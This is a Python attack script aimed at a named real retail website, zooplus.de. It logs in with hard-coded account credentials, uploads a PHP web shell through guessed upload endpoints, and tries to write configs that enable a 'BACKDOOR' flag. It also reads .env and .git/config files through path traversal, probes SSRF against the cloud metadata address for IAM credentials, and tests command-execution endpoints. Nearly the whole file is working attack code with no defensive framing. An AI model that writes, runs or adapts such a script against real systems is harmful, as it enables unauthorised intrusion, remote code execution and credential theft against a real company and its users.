#!/usr/bin/env python3
"""Exploit All Vectors with Authentication"""
import requests
import json
import base64
from urllib.parse import urljoin
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# Account credentials
ACCOUNT_B = {
    "email": "suobup@dunkos.xyz",
    "password": "suobup@dunkos.xyzQ1"
}

target = "www.zooplus.de"
base = f"https://{target}"
results = []
s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Type': 'application/json'
})

print("=" * 70)
print("EXPLOITING WITH AUTHENTICATION")
print("=" * 70)

# STEP 1: LOGIN
print("\n[STEP 1] Attempting login...")
print("-" * 70)

login_urls = [
    f"{base}/api/auth/login",
    f"{base}/api/login",
    f"{base}/login",
    f"{base}/api/v1/auth/login",
    f"{base}/api/v2/auth/login",
]

session_cookie = None

for login_url in login_urls:
    try:
        payload = {
            "email": ACCOUNT_B["email"],
            "password": ACCOUNT_B["password"]
        }
        resp = s.post(login_url, json=payload, timeout=5, verify=False, allow_redirects=False)
        
        if resp.status_code in [200, 201, 302]:
            # Check for session cookie
            cookies = resp.cookies
            if cookies:
                for cookie in cookies:
                    if 'sid' in cookie.name.lower() or 'session' in cookie.name.lower():
                        session_cookie = f"{cookie.name}={cookie.value}"
                        print(f"  [SUCCESS] Login successful!")
                        print(f"      Cookie: {session_cookie[:80]}...")
                        break
                if session_cookie:
                    break
            
            # Check Set-Cookie header
            set_cookie = resp.headers.get('Set-Cookie', '')
            if 'sid=' in set_cookie or 'session=' in set_cookie:
                session_cookie = set_cookie.split(';')[0]
                print(f"  [SUCCESS] Login successful!")
                print(f"      Cookie: {session_cookie[:80]}...")
                break
    except Exception as e:
        pass

if not session_cookie:
    print("  [WARNING] Could not login automatically")
    print("  [INFO] Using manual cookie if provided...")
    # Try to use cookie from previous tests
    # You can manually set it here if you have it
    # session_cookie = "sid=YOUR_COOKIE_HERE"

# Set cookie for all requests
if session_cookie:
    s.headers.update({'Cookie': session_cookie})
    print(f"\n[+] Using session: {session_cookie[:50]}...")

# STEP 2: EXPLOIT FILE UPLOAD
print("\n[STEP 2] EXPLOITING FILE UPLOAD...")
print("-" * 70)

upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/upload",
]

php_shell = "<?php system($_GET['cmd']); ?>"

for endpoint in upload_endpoints:
    url = urljoin(base, endpoint)
    
    # Multipart
    try:
        files = {'file': ('shell.php', php_shell, 'application/x-php')}
        resp = s.post(url, files=files, timeout=5, verify=False, allow_redirects=False)
        
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            response_data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else resp.text
            
            results.append({
                "vector": "file_upload",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "status": resp.status_code,
                "location": location,
                "response": str(response_data)[:500]
            })
            print(f"  [CRITICAL] File Upload SUCCESS: {endpoint}")
            print(f"      Status: {resp.status_code}")
            if location:
                print(f"      Location: {location}")
    except:
        pass
    
    # JSON format
    try:
        payload = {
            "file": base64.b64encode(php_shell.encode()).decode(),
            "filename": "shell.php",
            "content_type": "application/x-php"
        }
        resp = s.post(url, json=payload, timeout=5, verify=False, allow_redirects=False)
        if resp.status_code in [200, 201]:
            results.append({
                "vector": "file_upload_json",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "status": resp.status_code
            })
            print(f"  [CRITICAL] File Upload (JSON) SUCCESS: {endpoint}")
    except:
        pass

# STEP 3: EXPLOIT CONFIG
print("\n[STEP 3] EXPLOITING CONFIG INJECTION...")
print("-" * 70)

config_url = urljoin(base, "/api/config")

# Read
try:
    resp = s.get(config_url, timeout=5, verify=False, allow_redirects=False)
    if resp.status_code == 200:
        config_data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else resp.text
        results.append({
            "vector": "config_read",
            "severity": "HIGH",
            "config": str(config_data)[:1000]
        })
        print(f"  [HIGH] Config Read SUCCESS!")
        print(f"      Config preview: {str(config_data)[:200]}")
except:
    pass

# Write
malicious_configs = [
    {"debug": True, "log_level": "debug"},
    {"env": {"BACKDOOR": "enabled", "DEBUG": "1"}},
    {"settings": {"allow_exec": True}},
]

for config in malicious_configs:
    for method in ['POST', 'PUT', 'PATCH']:
        try:
            resp = s.request(method, config_url, json=config, timeout=5, verify=False, allow_redirects=False)
            if resp.status_code in [200, 201, 204]:
                results.append({
                    "vector": "config_write",
                    "severity": "CRITICAL",
                    "method": method,
                    "config": config,
                    "status": resp.status_code
                })
                print(f"  [CRITICAL] Config Write SUCCESS ({method})!")
                print(f"      Config: {config}")
                break
        except:
            pass

# STEP 4: EXPLOIT PATH TRAVERSAL
print("\n[STEP 4] EXPLOITING PATH TRAVERSAL...")
print("-" * 70)

target_files = [
    "/.env",
    "/.env.local",
    "/config.json",
    "/.git/config",
    "/package.json",
]

for file in target_files:
    for pattern in [f"/stats/../{file.lstrip('/')}", f"/stats/../../{file.lstrip('/')}"]:
        url = urljoin(base, pattern)
        try:
            resp = s.get(url, timeout=3, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                content = resp.text
                if not content.strip().startswith('<!') and len(content) < 50000:
                    indicators = ['NODE_ENV', 'AWS_', 'DB_', 'SECRET', 'PASSWORD', 'API_KEY', 'config', 'package']
                    if any(ind in content for ind in indicators):
                        results.append({
                            "vector": "path_traversal",
                            "severity": "CRITICAL",
                            "file": file,
                            "path": pattern,
                            "content": content[:1000]
                        })
                        print(f"  [CRITICAL] Path Traversal SUCCESS: {file}")
                        print(f"      Content preview: {content[:200]}")
                        break
        except:
            pass

# STEP 5: EXPLOIT SSRF
print("\n[STEP 5] EXPLOITING SSRF...")
print("-" * 70)

ssrf_endpoints = [
    "/api/fetch",
    "/api/proxy",
    "/api/request",
    "/api/url",
]

for endpoint in ssrf_endpoints:
    url = urljoin(base, endpoint)
    payloads = [
        {"url": "http://169.254.169.254/latest/meta-data/"},
        {"endpoint": "http://169.254.169.254/latest/meta-data/"},
        {"link": "http://169.254.169.254/latest/meta-data/"},
    ]
    
    for payload in payloads:
        try:
            resp = s.post(url, json=payload, timeout=3, verify=False, allow_redirects=False)
            if resp.status_code in [200, 400, 500]:
                content = resp.text.lower()
                if any(ind in content for ind in ['metadata', 'iam', 'credentials', 'instance']):
                    results.append({
                        "vector": "ssrf",
                        "severity": "CRITICAL",
                        "endpoint": endpoint,
                        "status": resp.status_code,
                        "response": resp.text[:1000]
                    })
                    print(f"  [CRITICAL] SSRF SUCCESS: {endpoint}")
                    print(f"      Response preview: {resp.text[:300]}")
                    break
        except:
            pass

# STEP 6: EXPLOIT CODE EXECUTION
print("\n[STEP 6] EXPLOITING CODE EXECUTION...")
print("-" * 70)

exec_endpoints = [
    "/api/execute",
    "/api/eval",
    "/api/run",
    "/api/script",
    "/api/command",
]

for endpoint in exec_endpoints:
    url = urljoin(base, endpoint)
    payloads = [
        {"code": "print('test')"},
        {"command": "id"},
        {"script": "console.log('test')"},
    ]
    
    for payload in payloads:
        try:
            resp = s.post(url, json=payload, timeout=3, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                if "test" in resp.text.lower() or "uid=" in resp.text.lower():
                    results.append({
                        "vector": "code_execution",
                        "severity": "CRITICAL",
                        "endpoint": endpoint,
                        "payload": payload,
                        "output": resp.text[:500]
                    })
                    print(f"  [CRITICAL] Code Execution SUCCESS: {endpoint}")
                    print(f"      Output: {resp.text[:200]}")
                    break
        except:
            pass

# SUMMARY
print("\n" + "=" * 70)
print("EXPLOITATION SUMMARY")
print("=" * 70)
print(f"Total successful exploitations: {len(results)}")

if results:
    critical = len([r for r in results if r['severity'] == 'CRITICAL'])
    high = len([r for r in results if r['severity'] == 'HIGH'])
    
    print(f"  CRITICAL: {critical}")
    print(f"  HIGH: {high}")
    
    by_type = {}
    for r in results:
        vtype = r['vector']
        by_type[vtype] = by_type.get(vtype, 0) + 1
    
    print("\nExploited Vectors:")
    for vtype, count in by_type.items():
        print(f"  {vtype}: {count}")
    
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/exploitation_with_auth.json", "w") as f:
        json.dump({
            "target": target,
            "account": ACCOUNT_B["email"],
            "scan_date": datetime.now().isoformat(),
            "total_exploited": len(results),
            "results": results
        }, f, indent=2)
    
    print(f"\n[+] Results saved to: reports/exploitation_with_auth.json")
    
    if critical > 0:
        print("\n[!!!] CRITICAL VULNERABILITIES EXPLOITED!")
else:
    print("  No successful exploitations")

print("=" * 70)

